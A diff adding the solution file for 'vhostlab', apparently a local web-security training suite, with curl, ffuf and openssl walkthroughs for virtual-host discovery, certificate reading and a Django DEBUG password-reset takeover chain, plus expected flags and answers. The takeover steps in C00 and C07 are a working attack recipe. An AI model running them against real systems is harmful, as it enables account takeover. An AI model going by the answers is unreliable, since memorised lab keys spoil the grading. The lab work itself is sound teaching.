@@ -1,0 +1,903 @@
+vhostlab - ALL LAB SOLUTIONS (plain text)
+generated: 2026-11-22T09:52:03Z
+suite    : /Users/dk/labs/vhostlab
+
+one section per lab; each section starts at the line '==== LAB: <name> ===='
+run 'make verify LAB=<name>' to grade a lab after following its steps.
+
+
+
+==== LAB: c00-full-chain ====
+
+C00 - FULL CHAIN (THE WRITEUP END TO END)
+==========================================
+Lab      : c00-full-chain
+Case     : all (C1-C10), decoys on
+Ports    : HTTP 18180, HTTPS 18543
+Start    : make up LAB=c00-full-chain
+Verify   : make verify LAB=c00-full-chain      (20 assertions)
+
+OBJECTIVE
+  One IP, everything on: bare-IP wall, wildcard certificate, decoy vhosts, content
+  discovery, JS pivot, second vhost, Django DEBUG=True with broken SMTP, and the
+  keyword-routed portal. Walk it as the author did and finish with admin access.
+
+STEP 1 - the wall (C1)
+  curl -skI https://127.0.0.1:18543/ | grep -Ei 'HTTP/|server|content-length'
+  expected:
+    HTTP/1.1 404 Not Found
+    server: Microsoft-HTTPAPI/2.0
+    content-length: 0
+
+STEP 2 - the certificate (C2)
+  tlsx -u 127.0.0.1:18543 -san -cn -silent -json | jq '.subject_an'
+  expected: ["corp.lab","*.corp.lab"]
+
+STEP 3 - the hostname (C3)
+  for w in $(cat _shared/data/vhost-labels.txt); do
+    [ "$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: $w.corp.lab" \
+        https://127.0.0.1:18543/robots.txt)" = 200 ] && echo "HIT $w.corp.lab"
+  done
+  expected: HIT chatadmin.corp.lab
+  (the other vhosts are byte-identical default pages; old-portal is a 403 bait)
+
+STEP 4 - the application (C4)
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/robots.txt
+  expected: Disallow: /app
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/chatadmin \
+    | grep -o 'Chat Admin'
+  expected: Chat Admin
+
+STEP 5 - the backend (C5)
+  curl -sk -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18543/chatadmin/assets/app.js | grep API_BASE
+  expected: API_BASE: "https://chat-api.corp.lab/api"
+  curl -skI -H 'Host: chat-api.corp.lab' https://127.0.0.1:18543/nope | grep -i server
+  expected: server: Microsoft-IIS/10.0     (a site, not the wall)
+
+STEP 6 - the exploit (C7)
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code}\n' \
+    https://127.0.0.1:18543/api/auth/password_reset
+  expected: 500
+
+  TOKEN=$(grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1 | cut -d= -f2)
+  echo "$TOKEN"        # 32 hex chars, leaked in the drafted mail
+
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18543/api/auth/password_reset/confirm
+  expected: {"detail":"password updated"}
+
+  JWT=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' \
+    https://127.0.0.1:18543/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" \
+    https://127.0.0.1:18543/api/chats | grep -o 'FLAG{[^}]*}'
+  expected: FLAG{full_chain_hidden_vhost_to_admin}   (value depends on the compose env)
+
+STEP 7 - the keyword app on the same IP (C10)
+  curl -skI -H 'Host: portal' https://127.0.0.1:18543/ | grep -i x-app
+  expected: x-app: portal
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.attacker.test' \
+    https://127.0.0.1:18543/
+  expected: 200        (no domain allowlist)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal.' https://127.0.0.1:18543/
+  expected: 404        (trailing-dot gap)
+
+STEP 8 - what the decoys prove
+  curl -sk -H 'Host: vpn.corp.lab' https://127.0.0.1:18543/ | shasum -a1
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18543/ | shasum -a1
+  expected: identical hashes (same default page; only robots.txt/app differ)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: old-portal.corp.lab' \
+    https://127.0.0.1:18543/
+  expected: 403
+
+STEP 9 - the wall still holds
+  curl -skI -H 'Host: whoami.corp.lab' https://127.0.0.1:18543/ | grep -Ei 'HTTP/|server'
+  expected: 404 + server: Microsoft-HTTPAPI/2.0
+
+FINDINGS THIS CHAIN SUPPORTS
+  1. Password reset token disclosure -> account takeover. Critical. DEBUG=True plus
+     a failing mail path; the token is generated before delivery fails and the
+     technical page prints the drafted message.
+  2. Hidden vhost exposing an internal console. Impact only with (1); on its own it
+     is attack-surface expansion.
+  3. Keyword-routed app with no domain allowlist. Reportable only with the data or
+     operation you reach - which is why it needs the authenticated dashboard.
+
+TEARDOWN
+  make down LAB=c00-full-chain      (make reset LAB=c00-full-chain re-seeds)
+
+
+==== LAB: c01-bare-ip-404 ====
+
+C01 - BARE-IP 404 FINGERPRINT
+=====================================
+Lab      : c01-bare-ip-404
+Case     : C1 (writeup para 11-14)
+Ports    : HTTP 18080, HTTPS 18443
+Start    : make up LAB=c01-bare-ip-404
+Verify   : make verify LAB=c01-bare-ip-404      (13 assertions)
+
+OBJECTIVE
+  One IP answers on 443 with nothing useful. Establish that a virtual-host router
+  is in front and your request has no hostname it recognises, then prove the
+  contrast with a hostname it does know.
+
+STEP 1 - the wall
+  curl -skD - -o /dev/null https://127.0.0.1:18443/ | tr -d '\r'
+
+  expected (h2 by default; HEAD omits content-length, a GET does not):
+    HTTP/2 404
+    content-type: text/html
+    server: Microsoft-HTTPAPI/2.0
+    content-length: 0
+
+  add --http1.1 to see the classic line: HTTP/1.1 404 Not Found
+
+  Microsoft-HTTPAPI/2.0 is http.sys answering before any site binds the request.
+  A named HTTP platform + an empty body means "no site matched", not "file missing".
+
+STEP 2 - prove it is a wall, not a missing path
+  curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' https://127.0.0.1:18443/admin
+  expected: 404 0
+  same status, same zero length on any path = the router produced it.
+
+STEP 3 - the contrast
+  curl -skD - -o /dev/null -H 'Host: ok.corp.lab' https://127.0.0.1:18443/ | tr -d '\r'
+  expected:
+    HTTP/2 200
+    server: Microsoft-IIS/10.0
+    content-length: 1487
+  Two distinct Server values:
+    Microsoft-HTTPAPI/2.0 -> no site matched
+    Microsoft-IIS/10.0    -> a site matched and answered
+
+STEP 4 - also true on plain HTTP (some fuzzers only speak :80)
+  curl -sk -o /dev/null -w '%{http_code}\n' http://127.0.0.1:18080/
+  expected: 404
+  curl -skI http://127.0.0.1:18080/ | grep -i server
+  expected: server: Microsoft-HTTPAPI/2.0
+
+STEP 5 - no Host header at all
+  curl -sk -o /dev/null -w '%{http_code}\n' --http1.0 -H 'Host:' https://127.0.0.1:18443/
+  expected: 404 (still the wall)
+
+NEGATIVE CHECK (keeps the case honest)
+  'portal' as a Host is still a 404 here - keyword routing belongs to C10:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: portal' https://127.0.0.1:18443/
+  expected: 404
+
+WHY IT MATTERS
+  This is the observation that converts "one boring IP" into a target: the site
+  exists, you are addressing it wrong. Next case reads the certificate for names.
+
+TEARDOWN
+  make down LAB=c01-bare-ip-404
+
+
+==== LAB: c02-cert-san ====
+
+C02 - CERTIFICATE SAN/CN AS A DISCOVERY SOURCE
+================================================
+Lab      : c02-cert-san
+Case     : C2 (writeup para 16)
+Ports    : HTTP 18090, HTTPS 18453
+Start    : make up LAB=c02-cert-san
+Verify   : make verify LAB=c02-cert-san      (11 assertions)
+
+OBJECTIVE
+  Read the TLS certificate the IP hands out, turn it into a hostname list, then
+  separate what the certificate CLAIMS from what the front end actually SERVES.
+
+STEP 1 - grab the certificate (tool path from the writeup)
+  /Users/dk/.pdtm/go/bin/tlsx -u 127.0.0.1:18453 -san -cn -silent
+
+  expected:
+    127.0.0.1:18453 [corp.lab]
+    127.0.0.1:18453 [mail.corp.lab]
+    (the short form hides the wildcard - use -json)
+
+  /Users/dk/.pdtm/go/bin/tlsx -u 127.0.0.1:18453 -san -cn -silent -json | \
+    jq '{cn:.subject_cn, an:.subject_an, wildcard:.wildcard_certificate}'
+
+  expected:
+    {"cn":"corp.lab",
+     "an":["corp.lab","*.corp.lab","mail.corp.lab"],
+     "wildcard":true}
+
+  Note: the binary at /opt/homebrew/bin/httpx is python-httpx; ProjectDiscovery
+  lives in /Users/dk/.pdtm/go/bin. Same trap applies to every PD tool.
+
+STEP 2 - same answer with openssl (no tools required)
+  openssl s_client -connect 127.0.0.1:18453 -servername corp.lab </dev/null 2>/dev/null \
+    | openssl x509 -noout -text | sed -n '/Subject Alternative Name/,+1p'
+
+  expected:
+    X509v3 Subject Alternative Name:
+      DNS:corp.lab, DNS:*.corp.lab, DNS:mail.corp.lab
+
+  macOS ships LibreSSL: x509 -ext subjectAltName is unsupported, use -text.
+
+STEP 3 - a name in the certificate is a candidate, not a finding
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: mail.corp.lab' https://127.0.0.1:18453/
+  expected: 404
+  curl -skI -H 'Host: mail.corp.lab' https://127.0.0.1:18453/ | grep -i server
+  expected: server: Microsoft-HTTPAPI/2.0   (no site behind that name)
+
+STEP 4 - the apex is served
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: corp.lab' https://127.0.0.1:18453/
+  expected: 200
+
+STEP 5 - wildcard certificate != wildcard routing
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: zzz.corp.lab' https://127.0.0.1:18453/
+  expected: 404
+
+STEP 6 - no SNI still returns the same certificate
+  openssl s_client -connect 127.0.0.1:18453 </dev/null 2>/dev/null \
+    | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'
+  expected: the same three names (this is why passive grabs work)
+
+WHY IT MATTERS
+  *.corp.lab means any single-label subdomain is a legitimate certificate name,
+  so the next step is enumerating labels, not guessing domains. C03 does exactly
+  that against the same IP.
+
+TEARDOWN
+  make down LAB=c02-cert-san
+
+
+==== LAB: c03-wildcard-hosts ====
+
+C03 - WILDCARD HOST-HEADER FUZZING WITH DECOYS
+===============================================
+Lab      : c03-wildcard-hosts
+Case     : C3 (writeup para 16, 30)
+Ports    : HTTP 18100, HTTPS 18463
+Start    : make up LAB=c03-wildcard-hosts
+Verify   : make verify LAB=c03-wildcard-hosts      (18 assertions)
+
+OBJECTIVE
+  The certificate says *.corp.lab and the IP answers 404 to everything.
+  Enumerate labels, send them as Host headers, find the one vhost that serves an
+  application - without claiming the decoys.
+
+STEP 1 - baseline the noise
+  For ten decoys the root is byte-identical. Compare hashes, not lengths:
+    for h in vpn intranet owa citrix sso webmail remote files sharepoint monitor; do
+      printf '%-12s ' "$h"
+      curl -sk -H "Host: $h.corp.lab" https://127.0.0.1:18463/ | shasum -a1 | cut -c1-12
+    done
+  expected: every line ends with the same hash (f94b52ccf1c2)
+
+STEP 2 - find what a real site has and a default page does not
+  while read -r w; do
+    [ "$(curl -sk -o /dev/null -w '%{http_code}' -H "Host: $w.corp.lab" \
+        https://127.0.0.1:18463/robots.txt)" = 200 ] && echo "HIT $w.corp.lab"
+  done < _shared/data/vhost-labels.txt
+  expected: HIT chatadmin.corp.lab
+
+STEP 3 - the same with ffuf (the writeup's Burp Intruder equivalent)
+  ffuf -u https://127.0.0.1:18463/chatadmin \
+       -H 'Host: FUZZ.corp.lab' -w _shared/data/vhost-labels.txt \
+       -fc 403,404 -t 40 -of json -o /tmp/c03.json
+  jq -r '.results[] | "\(.status) \(.length) \(.input.FUZZ)"' /tmp/c03.json
+  expected: 200 357 chatadmin
+
+STEP 4 - read the winner
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18463/robots.txt
+  expected:
+    User-agent: *
+    Disallow: /chatadmin
+    Disallow: /chatadmin/api
+
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18463/chatadmin
+  expected: the "Chat Admin" shell (357 bytes)
+
+STEP 5 - understand the traps
+  403 bait - a rule matched, nothing is served:
+    curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: old-portal.corp.lab' \
+      https://127.0.0.1:18463/
+    expected: 403   (Server: Microsoft-HTTPAPI/2.0 - no site)
+  decoys - 200 but the wrong body:
+    curl -sk -H 'Host: vpn.corp.lab' https://127.0.0.1:18463/chatadmin \
+      | grep -o '404 - File or directory not found.'
+    expected: the IIS error page, not an application
+
+STEP 6 - IIS path semantics (why a lowercase wordlist is enough)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18463/CHATADMIN
+  expected: 200
+
+WHY IT MATTERS
+  Status and length triage cannot separate ten identical decoys. The signal is
+  behaviour on a path only a real application would have. A 403 is a lead about
+  a rule, never a finding.
+
+TEARDOWN
+  make down LAB=c03-wildcard-hosts
+
+
+==== LAB: c04-content-discovery ====
+
+C04 - CONTENT DISCOVERY ON A DEFAULT PAGE
+==========================================
+Lab      : c04-content-discovery
+Case     : C4 (writeup para 32-42)
+Ports    : HTTP 18110, HTTPS 18473
+Start    : make up LAB=c04-content-discovery
+Verify   : make verify LAB=c04-content-discovery      (15 assertions)
+
+OBJECTIVE
+  You have a vhost whose root is an IIS default page: nothing to crawl, nothing in
+  Wayback. Find the application root with active discovery and tell a hit from bait.
+
+STEP 1 - confirm there is nothing passive to chew on
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18473/ | grep -o 'IIS Windows Server'
+  expected: IIS Windows Server   (the default page)
+  There is no sitemap, no directory listing, no links into an app.
+
+STEP 2 - measure the baseline before fuzzing
+  curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' \
+    -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18473/definitely-not-here
+  expected: 404 1232
+  The miss is a full IIS error page, so -fs 1232 removes ~56k identical answers.
+
+STEP 3 - discovery with the writeup's wordlist
+  W=/Users/dk/tools/wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+  ffuf -u https://127.0.0.1:18473/FUZZ -H 'Host: chatadmin.corp.lab' \
+       -w "$W" -fs 1232 -fc 403 -t 40 -timeout 10 -of json -o /tmp/c04.json
+
+  jq -r '.results[] | "\(.status) \(.length) \(.input.FUZZ)"' /tmp/c04.json
+  expected: 200 357 chatadmin
+  (56 162 words, ~5 seconds against a local target; do not use -t 100 here,
+   requests get dropped and the one hit can be missed)
+
+STEP 4 - the app and its bundle
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18473/chatadmin
+  expected: <div id="app">Chat Admin - internal live-chat management console.</div>
+
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18473/chatadmin/assets/app.js
+  expected: window.__ENV = { API_BASE: "https://chat-api.corp.lab/api" };
+
+STEP 5 - case-insensitivity (why the lowercase wordlist is safe on IIS)
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18473/CHATADMIN
+  expected: 200
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18473/ChatAdmin/
+  expected: 200
+
+STEP 6 - the bait
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18473/chatadmin.backup
+  expected: 403
+  The vhost knows the path and refuses it: a lead to keep, not an app root.
+
+STEP 7 - no directory listing (so discovery really is required)
+  curl -sk -H 'Host: chatadmin.corp.lab' https://127.0.0.1:18473/chatadmin/ | grep -c 'Index of /'
+  expected: 0
+
+WHY IT MATTERS
+  Measure the baseline first; filter on it. Then read the bundle - the next case
+  starts at the API_BASE you just found.
+
+TEARDOWN
+  make down LAB=c04-content-discovery
+
+
+==== LAB: c05-js-api-pivot ====
+
+C05 - JS BUNDLE TO SECOND VHOST (404 SIGNATURES)
+=================================================
+Lab      : c05-js-api-pivot
+Case     : C5 (writeup para 44-48)
+Ports    : HTTP 18120, HTTPS 18483
+Start    : make up LAB=c05-js-api-pivot
+Verify   : make verify LAB=c05-js-api-pivot      (16 assertions)
+
+OBJECTIVE
+  The SPA calls a backend on another hostname. Prove that hostname is real by
+  comparing 404 signatures instead of trusting a string in a bundle - and
+  recognise the decoy URL.
+
+STEP 1 - read the bundle
+  curl -sk -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18483/chatadmin/assets/app.js | grep -E 'API_BASE|STAGING_API'
+
+  expected:
+    API_BASE: "https://chat-api.corp.lab/api",
+    STAGING_API: "https://chat-staging.corp.lab/api",
+
+STEP 2 - the signature test (the actual technique)
+  curl -skI -H 'Host: chat-api.corp.lab' https://127.0.0.1:18483/nope | grep -i server
+  expected: server: Microsoft-IIS/10.0      (a site answered)
+  curl -skI https://127.0.0.1:18483/nope | grep -i server
+  expected: server: Microsoft-HTTPAPI/2.0   (no site matched)
+  Same status code (404), different owner. That is the discriminator.
+
+  Body sizes, if you want the numbers:
+  curl -sk -o /dev/null -w '%{size_download}\n' -H 'Host: chat-api.corp.lab' \
+    https://127.0.0.1:18483/nope      # 936  (IIS error page)
+  curl -sk -o /dev/null -w '%{size_download}\n' https://127.0.0.1:18483/nope   # 0  (the wall)
+
+STEP 3 - the API is live, not just a name
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18483/api/ | jq .
+  expected:
+    {"users":"/api/users/",
+     "auth/password_reset":"/api/auth/password_reset",
+     "chats":"/api/chats/",
+     "chat-status":"/api/chat-status"}
+
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18483/api/chat-status | jq .
+  expected: {"service":"chat-api","status":"ok","build":"2026.11.1"}
+  One working endpoint is what separates a vhost from a string.
+
+STEP 4 - the decoy
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-staging.corp.lab' \
+    https://127.0.0.1:18483/api/
+  expected: 404
+  curl -skI -H 'Host: chat-staging.corp.lab' https://127.0.0.1:18483/api/ | grep -i server
+  expected: server: Microsoft-HTTPAPI/2.0   -> it was never a vhost
+
+STEP 5 - the two sites are different applications
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18483/api/ | grep -c 'Chat Admin'
+  expected: 0
+  curl -sk -D - -o /dev/null -H 'Host: chat-api.corp.lab' https://127.0.0.1:18483/api/ \
+    | tr -d '\r' | grep -i content-type
+  expected: content-type: application/json
+
+WHY IT MATTERS
+  A URL in a bundle is a hypothesis. Two independent signals confirm a vhost: a
+  Server header that belongs to a site, and a path that answers with that site's
+  application. The decoy has neither - which is how you avoid reporting a hostname
+  you invented from a string.
+
+TEARDOWN
+  make down LAB=c05-js-api-pivot
+
+
+==== LAB: c06-browser-dns ====
+
+C06 - BROWSER PATH: DNS OVERRIDE, CA TRUST, BROWSABLE API
+==========================================================
+Lab      : c06-browser-dns
+Case     : C6 (writeup para 54)
+Ports    : HTTP 18130, HTTPS 18493
+Start    : make up LAB=c06-browser-dns
+Verify   : make verify LAB=c06-browser-dns      (11 assertions)
+
+OBJECTIVE
+  Stop using raw Host headers. Make the hostnames resolve and the certificate
+  trusted so the SPA and the API behave like they do for a real user - that is
+  where DRF's browsable API and sequence bugs actually show up.
+
+SETUP (one time)
+  Burp: Settings -> Network -> DNS -> Override hostname resolution
+        *.corp.lab  ->  127.0.0.1
+  Trust: import _shared/certs/out/ca.crt into Burp TLS and the browser
+         (scripts/import-ca.sh does the macOS keychain, run it by hand)
+  Browse: https://chatadmin.corp.lab:18493/chatadmin
+          https://chat-api.corp.lab:18493/api/
+
+  No /etc/hosts change is needed: every check uses curl --resolve.
+
+STEP 1 - content negotiation (what makes DRF browsable)
+  curl -sk -D - -o /dev/null -H 'Host: chat-api.corp.lab' \
+    https://127.0.0.1:18493/api/ | tr -d '\r' | grep -i content-type
+  expected: content-type: application/json
+
+  curl -sk -D - -o /dev/null -H 'Host: chat-api.corp.lab' -H 'Accept: text/html' \
+    https://127.0.0.1:18493/api/ | tr -d '\r' | grep -i content-type
+  expected: content-type: text/html; charset=utf-8
+
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Accept: text/html' \
+    https://127.0.0.1:18493/api/ | grep -o 'Django REST framework' | head -1
+  expected: Django REST framework
+
+STEP 2 - the SPA is the same deployment, not a separate host
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18493/chatadmin
+  expected: 200
+  curl -sk -H 'Host: chatadmin.corp.lab' \
+    https://127.0.0.1:18493/chatadmin/assets/app.js | grep API_BASE
+  expected: API_BASE: "https://chat-api.corp.lab/api"
+
+STEP 3 - the certificate chains to the lab CA (so one import is enough)
+  openssl verify -CAfile _shared/certs/out/ca.crt \
+    labs/c06-browser-dns/edge/certs/lab.crt
+  expected: .../lab.crt: OK
+
+  It is the certificate actually served:
+  openssl s_client -connect 127.0.0.1:18493 -servername chat-api.corp.lab </dev/null 2>/dev/null \
+    | openssl x509 -noout -fingerprint -sha256
+  compare with:  openssl x509 -in labs/c06-browser-dns/edge/certs/lab.crt -noout -fingerprint -sha256
+
+STEP 4 - no redirect loops (a classic browser-only failure on vhosts)
+  curl -sk -o /dev/null -w '%{num_redirects}\n' -H 'Host: chat-api.corp.lab' \
+    https://127.0.0.1:18493/api/
+  expected: 0
+
+STEP 5 - what a browser must not be given
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Accept: text/html' \
+    https://127.0.0.1:18493/api/ | grep -c 'Index of /'
+  expected: 0
+
+WHY IT MATTERS
+  Once the browser resolves the vhosts, the browsable API shows endpoint shapes
+  (/api/auth/password_reset, /api/chats) that become the input to C07. Note the
+  deliberate absence of CORS headers: a report based only on "CORS missing" is not
+  this lab's target.
+
+TEARDOWN
+  make down LAB=c06-browser-dns
+
+
+==== LAB: c07-django-debug ====
+
+C07 - DJANGO DEBUG + BROKEN SMTP = RESET TOKEN = ADMIN
+======================================================
+Lab      : c07-django-debug
+Case     : C7 (writeup para 56-67)
+Ports    : HTTP 18140, HTTPS 18503
+Start    : make up LAB=c07-django-debug
+Verify   : make verify LAB=c07-django-debug      (22 assertions)
+
+OBJECTIVE
+  Trigger an error in the password-reset flow, read the technical 500 page, and
+  take admin. This is the exploit case - the writeup's whole chain lands here.
+
+STEP 1 - the API is DRF and lists its surface
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18503/api/ | jq .
+  expected: users, auth/password_reset, auth/login, chats, chat-status
+
+STEP 2 - trigger the 500 (broken SMTP behind DEBUG=True)
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code} %{size_download}\n' \
+    https://127.0.0.1:18503/api/auth/password_reset
+  expected: 500 127374
+  (the writeup's page was ~135 727 bytes; same shape, different stack depth)
+
+STEP 3 - what is in the page
+  grep -c 'Traceback' /tmp/500.html
+  expected: 5
+  grep -o 'ConnectionRefusedError' /tmp/500.html | head -1
+  expected: ConnectionRefusedError
+  grep -c 'Reset link:' /tmp/500.html
+  expected: >= 1   (the drafted mail body is a frame local, printed in full)
+
+STEP 4 - harvest the token
+  grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1
+  expected: token=01c072d9398c547ec5eb138217bfee78   (value changes per request)
+
+  TOKEN=$(grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1 | cut -d= -f2)
+
+STEP 5 - redeem it
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18503/api/auth/password_reset/confirm
+  expected: {"detail":"password updated"}
+
+  Replay the same token:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18503/api/auth/password_reset/confirm
+  expected: 400   (single use)
+
+STEP 6 - log in as admin and read the data
+  JWT=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' \
+    https://127.0.0.1:18503/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" \
+    https://127.0.0.1:18503/api/chats | jq -r '.results[].body' | grep FLAG
+  expected: Admin console verification token: FLAG{django_debug_leaked_the_reset_token}
+
+  /api/users/ as admin:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    -H "Authorization: Bearer $JWT" https://127.0.0.1:18503/api/users/
+  expected: 200
+
+STEP 7 - negative controls (why "I logged in" is not a pass)
+  Anonymous user list:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    https://127.0.0.1:18503/api/users/
+  expected: 401 or 403
+
+  Agent login cannot see the flag:
+  AG=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"alex@corp.lab","password":"agent-pass-2026"}' \
+    https://127.0.0.1:18503/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $AG" \
+    https://127.0.0.1:18503/api/chats | grep -c 'FLAG{'
+  expected: 0
+
+  A 404 does not leak (DEBUG only renders unhandled 500s):
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18503/api/nope | grep -c Traceback
+  expected: 0
+
+WHY IT WORKS (the writeup's own root cause)
+  DEBUG=True renders the traceback AND the local variables of every frame. The view
+  builds the reset mail as a local string before handing it to EmailMessage; SMTP
+  refuses the connection, so the exception is raised AFTER the token was generated -
+  and the technical page prints that string. DEBUG=False returns a bare 500.
+
+REMEDIATION (as in the writeup)
+  DEBUG=False in production; treat a failing mail path as an error that never
+  surfaces the message; monitor for 500s on the reset endpoint.
+
+TEARDOWN
+  make down LAB=c07-django-debug     (use reset to drop the seeded volume: make reset)
+
+
+==== LAB: c08-sni-routing ====
+
+C08 - SNI VS HOST HEADER
+=========================
+Lab      : c08-sni-routing
+Case     : C8 (writeup para 16, SNI detail)
+Ports    : HTTP 18150, HTTPS 18513
+Start    : make up LAB=c08-sni-routing
+Verify   : make verify LAB=c08-sni-routing      (11 assertions)
+
+OBJECTIVE
+  Separate the two controls that get conflated in vhost work: SNI picks the
+  certificate, the Host header picks the site. Learn what a mismatch actually
+  means before you report the wrong thing.
+
+STEP 1 - two certificates, one listener
+  U=127.0.0.1:18513
+  fp() { openssl s_client -connect $U ${1:+-servername $1} </dev/null 2>/dev/null \
+         | openssl x509 -noout -fingerprint -sha256; }
+
+  fp corp.lab
+  expected: the public leaf fingerprint (labs/c08-sni-routing/edge/certs/lab.crt)
+
+  fp internal.corp.lab
+  expected: a DIFFERENT fingerprint (internal.crt)
+
+  fp nothing.corp.lab
+  expected: back to the public leaf (unknown SNI falls back to default)
+
+STEP 2 - the internal certificate names a different zone
+  openssl s_client -connect $U -servername internal.corp.lab </dev/null 2>/dev/null \
+    | openssl x509 -noout -text | sed -n '/Subject Alternative Name/,+1p'
+  expected: DNS:internal.corp.lab, DNS:*.internal.corp.lab   (no corp.lab in it)
+
+STEP 3 - routing ignores SNI entirely
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: app.corp.lab' https://$U/
+  expected: 200
+  curl -sk -H 'Host: admin.internal.corp.lab' https://$U/ | grep -o 'Internal Admin'
+  expected: Internal Admin        (200, while the PUBLIC certificate was presented)
+
+STEP 4 - and the internal certificate unlocks nothing by itself
+  curl -sk -o /dev/null -w '%{http_code}\n' --resolve app.corp.lab:18513:127.0.0.1 \
+    https://app.corp.lab:18513/
+  expected: 200   (public site; SNI choice does not change routing)
+
+STEP 5 - what the 4-way matrix shows
+  SNI corp.lab       + Host app.corp.lab              -> 200, public cert, no warning
+  SNI corp.lab       + Host admin.internal.corp.lab   -> 200, cert does not match Host
+                                                         (browser warning, full access)
+  SNI internal...    + Host admin.internal.corp.lab   -> 200, clean
+  SNI internal...    + Host app.corp.lab              -> 200, cert does not match Host
+
+WHY IT MATTERS
+  A mismatch warning is a certificate observation, not access to the internal zone.
+  "The certificate has a different name" is a lead about naming; "the Host header
+  reaches a site" is a lead about routing. Two separate findings, each needing its
+  own impact. And unknown-SNI fallback is why passive certificate grabs work.
+
+TEARDOWN
+  make down LAB=c08-sni-routing
+
+
+==== LAB: c09-decoy-fuzz ====
+
+C09 - DECOY DISCIPLINE: 40 HOSTS, 1 REAL, ZERO FALSE POSITIVES
+===============================================================
+Lab      : c09-decoy-fuzz
+Case     : C9 (writeup para 30, triage discipline)
+Ports    : HTTP 18160, HTTPS 18523
+Start    : make up LAB=c09-decoy-fuzz
+Verify   : make verify LAB=c09-decoy-fuzz      (15 assertions)
+
+OBJECTIVE
+  Same sweep as C03 against an adversarial set: 39 look-alikes, including catch-alls
+  that answer 200 to every path and 8 hosts whose headers claim to be the real one.
+  The grade is precision.
+
+STEP 1 - enumerate the candidates
+  jq -r '.sites[].host' labs/c09-decoy-fuzz/edge/sites.json
+  expected: 40 lines (chatadmin + 39 decoys)
+  The unbounded label list is _shared/data/vhost-labels.txt plus app01..app16.
+
+STEP 2 - score on body content, never on status
+  for h in $(jq -r '.sites[].host' labs/c09-decoy-fuzz/edge/sites.json); do
+    b=$(curl -sk -H "Host: $h" https://127.0.0.1:18523/app)
+    case "$b" in *"Chat Admin"*) echo "HIT $h";; esac
+  done
